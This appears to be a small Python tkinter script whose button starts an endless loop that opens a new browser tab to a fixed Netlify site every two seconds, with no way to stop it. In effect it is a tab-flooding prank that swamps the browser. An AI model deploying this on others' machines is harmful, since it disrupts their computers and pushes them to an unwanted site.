import webbrowser
import time
from tkinter import *

window = Tk()
window.title("")


def zafar():
    
    while True:

        webbrowser.open_new_tab('https://metallplaza.netlify.app/')

        time.sleep(2)

verb = Entry(window)
verb.pack()

butt = Button(window, text = "Zafar 06", command = zafar)
butt.pack()

jav = []
for x in range(6):
    jav.append(Label(window))

window.mainloop()